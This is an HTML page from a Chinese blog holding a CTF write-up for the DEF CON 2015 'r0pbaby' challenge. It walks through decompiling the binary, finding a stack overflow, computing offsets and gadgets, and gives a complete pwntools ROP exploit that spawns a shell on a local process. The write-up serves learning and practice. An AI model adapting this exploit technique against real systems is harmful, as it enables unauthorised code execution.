@@ -1,0 +1,1046 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 前言练练手~ 0x01 程序分析1234567891011121314151617181920212223242526272829mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ ./r0pbaby Welcome to an easy Return Oriented Programming challenge...Menu:1) G">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Defcon2015R0pbaby">
+<meta property="og:url" content="http://yoursite.com/2018/03/17/Defcon2015R0pbaby/index.html">
+<meta property="og:site_name" content="Mask&#39;s Blog">
+<meta property="og:description" content="0x00 前言练练手~ 0x01 程序分析1234567891011121314151617181920212223242526272829mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ ./r0pbaby Welcome to an easy Return Oriented Programming challenge...Menu:1) G">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-03-17T12:08:43.948Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Defcon2015R0pbaby">
+<meta name="twitter:description" content="0x00 前言练练手~ 0x01 程序分析1234567891011121314151617181920212223242526272829mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ ./r0pbaby Welcome to an easy Return Oriented Programming challenge...Menu:1) G">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/17/Defcon2015R0pbaby/"/>
+
+
+
+
+
+  <title>Defcon2015R0pbaby | Mask's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mask's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/17/Defcon2015R0pbaby/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Mask">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mask's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Defcon2015R0pbaby</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-17T19:34:44+08:00">
+                2018-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>练练手~</p>
+<h2 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ ./r0pbaby </span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 1</span><br><span class="line">libc.so.6: 0x00007FFFF7FF79B0</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 2</span><br><span class="line">Enter symbol: system</span><br><span class="line">Symbol system: 0x00007FFFF7857640</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 3</span><br><span class="line">Enter bytes to send (max 1024): 2</span><br><span class="line">ab</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: Bad choice.</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>程序大致了解，拉到IDA里查看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed int v3; // eax@4</span><br><span class="line">  unsigned __int64 v4; // r14@15</span><br><span class="line">  int v5; // er13@17</span><br><span class="line">  size_t v6; // r12@17</span><br><span class="line">  int v7; // eax@18</span><br><span class="line">  void *handle; // [sp+8h][bp-448h]@1</span><br><span class="line">  char nptr[1088]; // [sp+10h][bp-440h]@2</span><br><span class="line">  __int64 savedregs; // [sp+450h][bp+0h]@22</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  signal(14, (__sighandler_t)handler);</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  puts(&quot;\nWelcome to an easy Return Oriented Programming challenge...&quot;);</span><br><span class="line">  puts(&quot;Menu:&quot;);</span><br><span class="line">  handle = dlopen(&quot;libc.so.6&quot;, 1);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">while ( 1 )</span><br><span class="line">&#123;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">while ( 1 )</span><br><span class="line">&#123;</span><br><span class="line">  choice();</span><br><span class="line">  if ( !sub_B9A((__int64)nptr, 1024LL) )</span><br><span class="line">  &#123;</span><br><span class="line">puts(&quot;Bad choice.&quot;);</span><br><span class="line">return 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = strtol(nptr, 0LL, 10);</span><br><span class="line">  if ( v3 != 2 )</span><br><span class="line">break;</span><br><span class="line">  __printf_chk(1LL, (__int64)&quot;Enter symbol: &quot;);</span><br><span class="line">  if ( sub_B9A((__int64)nptr, 64LL) )</span><br><span class="line">  &#123;</span><br><span class="line">dlsym(handle, nptr);</span><br><span class="line">__printf_chk(1LL, (__int64)&quot;Symbol %s: 0x%016llX\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">puts(&quot;Bad symbol.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">if ( v3 &gt; 2 )</span><br><span class="line">  break;</span><br><span class="line">if ( v3 != 1 )</span><br><span class="line">  goto LABEL_24;</span><br><span class="line">__printf_chk(1LL, (__int64)&quot;libc.so.6: 0x%016llX\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v3 != 3 )</span><br><span class="line">break;</span><br><span class="line">  __printf_chk(1LL, (__int64)&quot;Enter bytes to send (max 1024): &quot;);</span><br><span class="line">  sub_B9A((__int64)nptr, 1024LL);</span><br><span class="line">  v4 = (signed int)strtol(nptr, 0LL, 10);</span><br><span class="line">  if ( v4 - 1 &gt; 1023 )</span><br><span class="line">  &#123;</span><br><span class="line">puts(&quot;Invalid amount.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">if ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">v7 = _IO_getc(stdin);</span><br><span class="line">if ( v7 == -1 )</span><br><span class="line">  break;</span><br><span class="line">nptr[v6] = v7;</span><br><span class="line">v6 = ++v5;</span><br><span class="line">if ( v4 &lt;= v5 )</span><br><span class="line">  goto LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = v5 + 1;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">&#125;</span><br><span class="line">LABEL_22:</span><br><span class="line">memcpy(&amp;savedregs, nptr, v6);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">if ( v3 == 4 )</span><br><span class="line">  break;</span><br><span class="line">LABEL_24:</span><br><span class="line">puts(&quot;Bad choice.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  dlclose(handle);</span><br><span class="line">  puts(&quot;Exiting.&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到有一处</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memcpy(&amp;savedregs, nptr, v6);</span><br></pre></td></tr></table></figure>
+<p>存在溢出漏洞，gdb开始调试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ gdb ./r0pbaby </span><br><span class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1</span><br><span class="line">Copyright (C) 2014 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./r0pbaby...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ pattern create 50</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&apos;</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
+<p>先随机生成50个字符串，然后运行时输入<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/mask/CTF/Defcon2015_R0pbaby/r0pbaby </span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 3</span><br><span class="line">Enter bytes to send (max 1024): 50</span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: Bad choice.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x0 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7ffff78fc870 (&lt;__write_nocancel+7&gt;:	cmprax,0xfffffffffffff001)</span><br><span class="line">RDX: 0x7ffff7bd19e0 --&gt; 0x0 </span><br><span class="line">RSI: 0x7ffff7bd0483 --&gt; 0xbd19e0000000000a </span><br><span class="line">RDI: 0x1 </span><br><span class="line">RBP: 0x4173414125414141 (&apos;AAA%AAsA&apos;)</span><br><span class="line">RSP: 0x7fffffffddd8 (&quot;ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&quot;)</span><br><span class="line">RIP: 0x555555554eb3 (ret)</span><br><span class="line">R8 : 0x7ffff7bd19e0 --&gt; 0x0 </span><br><span class="line">R9 : 0x555555554fbb --&gt; 0x732064614200203a (&apos;: &apos;)</span><br><span class="line">R10: 0x7ffff7fde740 (0x00007ffff7fde740)</span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0x555555554a60 (xorebp,ebp)</span><br><span class="line">R13: 0x7fffffffdeb0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x555555554eae:	popr14</span><br><span class="line">   0x555555554eb0:	popr15</span><br><span class="line">   0x555555554eb2:	poprbp</span><br><span class="line">=&gt; 0x555555554eb3:	ret</span><br><span class="line">   0x555555554eb4:	nopWORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x555555554ebe:	xchg   ax,ax</span><br><span class="line">   0x555555554ec0:	push   r15</span><br><span class="line">   0x555555554ec2:	movr15d,edi</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffddd8 (&quot;ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&quot;)</span><br><span class="line">0008| 0x7fffffffdde0 (&quot;AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&quot;)</span><br><span class="line">0016| 0x7fffffffdde8 (&quot;(AADAA;AA)AAEAAaAA0AAFAAbA&quot;)</span><br><span class="line">0024| 0x7fffffffddf0 (&quot;A)AAEAAaAA0AAFAAbA&quot;)</span><br><span class="line">0032| 0x7fffffffddf8 (&quot;AA0AAFAAbA&quot;)</span><br><span class="line">0040| 0x7fffffffde00 --&gt; 0x4162 (&apos;bA&apos;)</span><br><span class="line">0048| 0x7fffffffde08 --&gt; 0xab1996ba18949eb3 </span><br><span class="line">0056| 0x7fffffffde10 --&gt; 0x555555554a60 (xorebp,ebp)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x0000555555554eb3 in ?? ()</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
+<p>然后算一下偏移：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/x $rsp</span><br><span class="line"></span><br><span class="line">0x7fffffffddd8:	0x6e41412441414241</span><br><span class="line">gdb-peda$ pattern offset 0x6e41412441414241</span><br><span class="line">7944702841627689537 found at offset: 8</span><br></pre></td></tr></table></figure>
+<p>那么偏移为8</p>
+<p>下面来找gadgets<code>pop|ret</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;|grep rdi </span><br><span class="line"></span><br><span class="line">0x000000000001f7a6 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x0000000000022b1a : pop rdi ; ret</span><br><span class="line">0x00000000001331ad : pop rdi ; ret 0xffee</span><br><span class="line">mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$</span><br></pre></td></tr></table></figure>
+<p>然后system的地址程序的第二个功能以及提供了，然后是找<code>&quot;/bin/sh&quot;</code>字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/libc-database$ ./find system 640</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6 (id local-abcda3d9548f3fbdea4bbd1f4d3cc44c3866457f)</span><br><span class="line">mask@mask-virtual-machine:~/libc-database$ ./dump local-abcda3d9548f3fbdea4bbd1f4d3cc44c3866457f</span><br><span class="line">offset___libc_start_main_ret = 0x21ec5</span><br><span class="line">offset_system = 0x0000000000046640</span><br><span class="line">offset_dup2 = 0x00000000000ebfe0</span><br><span class="line">offset_read = 0x00000000000eb800</span><br><span class="line">offset_write = 0x00000000000eb860</span><br><span class="line">offset_str_bin_sh = 0x17ccdb</span><br><span class="line">mask@mask-virtual-machine:~/libc-database$</span><br></pre></td></tr></table></figure>
+<p>接下来编写exp：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./r0pbaby&quot;)</span><br><span class="line">system = 0x00007FFFF7857640</span><br><span class="line">rdi_gadget_offset = 0x22b1a</span><br><span class="line">bin_sh_offset = 0x17ccdb</span><br><span class="line">system_offset = 0x46640</span><br><span class="line">libc_base = system - system_offset</span><br><span class="line">print &quot;[+] libc base: [%x]&quot; % libc_base</span><br><span class="line">rdi_gadget_addr = libc_base + rdi_gadget_offset</span><br><span class="line">print &quot;[+] RDI gadget addr: [%x]&quot; % rdi_gadget_addr</span><br><span class="line">bin_sh_addr = libc_base + bin_sh_offset</span><br><span class="line">print &quot;[+] \&quot;/bin/sh\&quot; addr: [%x]&quot; % bin_sh_addr</span><br><span class="line">system_addr = 0x00007FFFF7857640</span><br><span class="line">print &quot;[+] system addr: [%x]&quot; % system_addr</span><br><span class="line">payload = &quot;A&quot;*8</span><br><span class="line">payload += p64(rdi_gadget_addr)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">io.recv(1024)</span><br><span class="line">io.sendline(&quot;3&quot;)</span><br><span class="line">io.recv(1024)</span><br><span class="line">io.send(&quot;%d\n&quot;%(len(payload)+1))</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(&quot;4&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ vim exp.py </span><br><span class="line">mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ python exp.py </span><br><span class="line">[+] Starting local process &apos;./r0pbaby&apos;: pid 12591</span><br><span class="line">[+] libc base: [7ffff7811000]</span><br><span class="line">[+] RDI gadget addr: [7ffff7833b1a]</span><br><span class="line">[+] &quot;/bin/sh&quot; addr: [7ffff798dcdb]</span><br><span class="line">[+] system addr: [7ffff7857640]</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: Exiting.</span><br><span class="line">$ id</span><br><span class="line">uid=1000(mask) gid=1000(mask) 组=1000(mask),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),999(docker)</span><br><span class="line">$ whoami</span><br><span class="line">mask</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/17/一道简单的栈溢出题/" rel="next" title="一道简单的栈溢出题">
